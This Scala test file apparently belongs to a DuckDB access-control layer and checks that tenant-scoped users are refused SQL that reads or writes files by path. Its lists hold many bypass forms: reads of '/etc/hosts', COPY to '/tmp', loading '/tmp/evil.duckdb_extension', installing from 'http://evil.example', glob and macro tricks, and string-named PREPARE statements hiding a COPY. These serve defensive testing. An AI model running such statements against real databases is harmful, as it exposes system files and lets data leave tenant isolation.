package ai.starlake.quack.edge.sql

import ai.starlake.acl.model.Config
import ai.starlake.quack.ondemand.rbac.EffectiveSet
import ai.starlake.quack.ondemand.state.{RbacUser, RolePermission}
import org.scalatest.flatspec.AnyFlatSpec
import org.scalatest.matchers.should.Matchers

/** Owner ruling 2026-10-11: a tenant-scoped principal never reads or writes a file by path, the
  * wildcard `*.*.* ALL` grant included; a superuser or a federated source must do it. Each form
  * below was admitted to a `*.*.* ALL` tenant principal before.
  */
class FileAccessScreenSpec extends AnyFlatSpec with Matchers:

  private val B = "`"

  private val fileForms = List(
    // file-reading table functions, every quoting
    "SELECT * FROM read_parquet('s3://bucket/x.parquet')",
    "SELECT * FROM read_csv('/data/x.csv')",
    "SELECT * FROM READ_CSV_AUTO('/data/x.csv')",
    "SELECT * FROM \"read_json\"('/data/x.json')",
    s"SELECT * FROM ${B}read_text$B('/etc/hosts')",
    "SELECT * FROM main.read_blob('/etc/hosts')",
    "SELECT * FROM glob('/data/*')",
    "SELECT * FROM parquet_metadata('x.parquet')",
    "SELECT * FROM parquet_schema('x.parquet')",
    "SELECT * FROM read_ndjson_auto('x.ndjson')",
    "SELECT * FROM iceberg_scan('s3://bucket/t')",
    "SELECT * FROM read_xlsx('x.xlsx')",
    "SELECT * FROM delta_scan('s3://bucket/d')",
    "SELECT * FROM read_single_parquet_file('x.parquet')",
    "SELECT * FROM t WHERE id IN (SELECT id FROM read_parquet('x.parquet'))",
    "INSERT INTO t SELECT * FROM read_csv('/data/x.csv')",
    "CREATE TABLE t AS SELECT * FROM read_json('x.json')",
    // string literals in table position
    "SELECT * FROM 'x.parquet'",
    "SELECT * FROM 's3://bucket/acme_tpch-1a2b3c4d/main/customer/x.parquet'",
    "SELECT * FROM t JOIN 's3://bucket/x.parquet' ON true",
    "SELECT * FROM t, '/data/x.csv'",
    "FROM 'x.csv'",
    "SUMMARIZE '/data/x.csv'",
    "DESCRIBE '/data/x.csv'",
    "CREATE TABLE t AS FROM 'x.csv'",
    "MERGE INTO t USING 'x.parquet' s ON t.id = s.id WHEN MATCHED THEN DELETE",
    // quoted identifiers DuckDB reads as a file
    "SELECT * FROM \"s3://bucket/x.parquet\"",
    s"SELECT * FROM ${B}file:///data/x.csv$B",
    "SELECT * FROM \"/data/x\".\"csv\"",
    // writes and whole-database copies
    "COPY t TO '/tmp/x.csv'",
    "COPY t FROM 's3://bucket/x.csv'",
    "COPY (SELECT 1) TO '/tmp/x.parquet' (FORMAT parquet)",
    "EXPLAIN ANALYZE COPY t TO '/tmp/x.csv'",
    "PREPARE p AS COPY t TO '/tmp/x.csv'",
    "EXPORT DATABASE '/tmp/d'",
    "IMPORT DATABASE '/tmp/d'",
    // opening a file by path
    "ATTACH '/tmp/x.duckdb' AS x",
    "ATTACH DATABASE 's3://bucket/x.duckdb' AS x (READ_ONLY)",
    "LOAD '/tmp/evil.duckdb_extension'",
    "INSTALL '/tmp/evil.duckdb_extension'",
    "FORCE INSTALL httpfs FROM 'http://evil.example'",
    // in a batch, inside a literal a function runs
    "SELECT 1; SELECT * FROM read_text('/etc/hosts')",
    "SELECT * FROM query('SELECT * FROM read_text(''/etc/hosts'')')",
    // a keyword-named alias or column before a comma join (each read the CSV on the 2.0 CLI)
    "SELECT * FROM range(1) AS values, '/etc/x.csv'",
    "SELECT * FROM range(1) AS set, '/etc/x.csv'",
    "SELECT * FROM range(1) set, '/etc/x.csv'",
    "SELECT * FROM range(1) AS values, ('/etc/x.csv')",
    "SELECT * FROM (SELECT 1 AS \"order\") r JOIN (SELECT 1 AS \"order\") s " +
      "ON r.order = s.order, '/etc/x.csv'",
    // 2.0 table macros whose body reads `query_table(source)`: any file or table by a string
    "SELECT * FROM histogram('/etc/x.csv', b)",
    "SELECT * FROM histogram_values('/etc/x.csv', b)",
    "SELECT * FROM histogram(source := '/etc/x.csv', col_name := b)",
    "SELECT * FROM histogram('/etc/x.csv', b, technique := 'sample')",
    "SELECT * FROM histogram('customer', c_email)",
    "SELECT * FROM orders o, histogram_values('s3://b/x.parquet', a) h",
    "SELECT * FROM \"histogram\"('/etc/x.csv', b)",
    "SELECT * FROM histogram('/etc/x.csv', b) set, t",
    // a quoted name holding a glob character reads every matching file (2.0 CLI); `csv` is a
    // JSqlParser keyword, so `"*".csv` does not parse
    "SELECT * FROM \"*\".csv",
    s"SELECT * FROM $B*$B.csv",
    "SELECT * FROM \"data_*\".csv",
    "SELECT * FROM \"data_*\".parquet",
    "SELECT * FROM \"data_*\"",
    "SET file_search_path = '/etc'; SELECT * FROM \"*\".csv"
  )

  private val admitted = List(
    "SELECT * FROM orders",
    "SELECT * FROM main.\"orders\"",
    "SELECT * FROM fedpg.public.t",
    "SELECT * FROM iceberg_cat.ns.t AT (VERSION => 1)",
    "SELECT * FROM duckdb_tables()",
    "SELECT 'x.parquet', '/data/x.csv' AS p FROM t WHERE path = 's3://b/x'",
    "SELECT trim(leading '/' from '/a/b.csv')",
    "COPY FROM DATABASE a TO b",
    "LOAD httpfs",
    // not a file read; refused to non-superusers in every mode by NodeSettingScreen.screenNodeWide
    "INSTALL httpfs",
    "INSERT INTO orders SELECT * FROM scan_data_from_quack_client(" +
      "'0f8e2c3a-1b2c-4d5e-8f90-0123456789ab', NULL::STRUCT(a INTEGER), ordered := true)",
    // the aggregate `histogram(expr)` shares the macro's name and reads no table
    "SELECT histogram(o_total) FROM orders",
    "SELECT o_id, histogram(o_total, [10, 100]) FROM orders GROUP BY o_id",
    // `IS [NOT] DISTINCT FROM` takes a value, not a table
    "SELECT * FROM orders WHERE o_comment IS DISTINCT FROM 'x'",
    "SELECT * FROM orders WHERE o_comment IS NOT DISTINCT FROM 'x'",
    "SELECT o_comment IS DISTINCT FROM 'x' FROM orders",
    "SELECT * FROM orders o JOIN lineitem l ON o.o_orderkey = l.l_orderkey " +
      "AND l.l_comment IS DISTINCT FROM 'z'",
    "SELECT * FROM orders ORDER BY o_id DESC, 'x'",
    "SELECT o_id AS \"Revenue / Cost\" FROM orders",
    // an alias is no table: judged from the parse, a path-shaped alias is a label
    "SELECT o_id AS \"/\" FROM orders",
    "SELECT o_id \"/path\" FROM orders",
    // dbt adapter's ordinary statements
    "create table \"lake\".\"main\".\"m__dbt_tmp\" as (select 1 as id)",
    "alter table \"lake\".\"main\".\"m__dbt_tmp\" rename to \"m\"",
    "select table_name from information_schema.tables where table_schema = 'main'",
    "begin",
    "commit"
  )

  "FileAccessScreen" should "refuse every direct file read or write" in
    fileForms.foreach(sql => withClue(sql)(FileAccessScreen.find(sql) shouldBe defined))

  it should "admit table reads, catalog functions, the client data scan and dbt statements" in
    admitted.foreach(sql => withClue(sql)(FileAccessScreen.find(sql) shouldBe None))

  private val cfg = Config.forDuckDB(Some("lake"), Some("main"), Set("lake"))

  "AccessGate" should "refuse it as not wildcard-coverable, for QoD and OPA alike" in
    fileForms.foreach { sql =>
      withClue(sql) {
        AccessGate.evaluate(sql, cfg, "lake", true, clientDataScans = true) match
          case GateOutcome.Refuse(reason, coverable, _) =>
            coverable shouldBe false
            reason should include("tenant-scoped")
          case other => fail(s"expected Refuse, got $other")
      }
    }

  private def perm(c: String, s: String, t: String, v: String) =
    RolePermission(s"rp-$c-$s-$t-$v", "role-1", c, s, t, v, None)
  private def eff(user: RbacUser, ps: RolePermission*) =
    EffectiveSet(user, Nil, Nil, ps.toList, Nil)
  private val tenantAll =
    eff(RbacUser("u-1", Some("t-1"), "alice", "user"), perm("*", "*", "*", "ALL"))
  private val superuser = eff(RbacUser("u-0", None, "root", "admin"))
  private val validator =
    new PostgresAclValidator(tenantCatalogs = _ => Set("lake"), filteredMetadata = true)
  private def validate(sql: String, e: EffectiveSet) =
    validator.validate(
      ValidationContext(
        username = "alice",
        database = "t-1/td-1/p-1",
        statement = sql,
        peer = "conn-1",
        defaultDatabase = Some("lake"),
        defaultSchema = Some("main"),
        effectiveSet = Some(e),
        clientDataScans = true
      )
    )

  "PostgresAclValidator" should "deny it to a tenant principal holding *.*.* ALL" in
    fileForms.foreach(sql => withClue(sql)(validate(sql, tenantAll) shouldBe a[Denied]))

  it should "leave a superuser unchanged" in
    fileForms.foreach(sql => withClue(sql)(validate(sql, superuser) shouldBe Allowed))

  it should "still admit the front door's client data scan to that principal" in {
    val scan = admitted.find(_.contains("scan_data_from_quack_client")).get
    validate(scan, tenantAll) shouldBe Allowed
  }

  // Audit F24: a string or dollar-quoted PREPARE name hid the prepared COPY from the verb check,
  // and the statement JSqlParser cannot read was then covered by a wildcard ALL grant.
  private val stringPrepares = List(
    "PREPARE 'p' AS COPY (SELECT 1) TO '/tmp/x.csv'",
    "PREPARE $$p$$ AS COPY (SELECT 1) TO 's3://other/x.parquet'",
    "PREPARE $t$p$t$ AS COPY (SELECT 1) TO '/tmp/x.csv'",
    "PREPARE E'p' AS COPY (SELECT 1) TO '/tmp/x.csv'"
  )

  "a PREPARE named by a string" should "have its prepared COPY found" in
    stringPrepares.foreach(sql => withClue(sql)(FileAccessScreen.find(sql) shouldBe defined))

  it should "be denied to a tenant principal holding *.*.* ALL" in
    stringPrepares.foreach(sql => withClue(sql)(validate(sql, tenantAll) shouldBe a[Denied]))
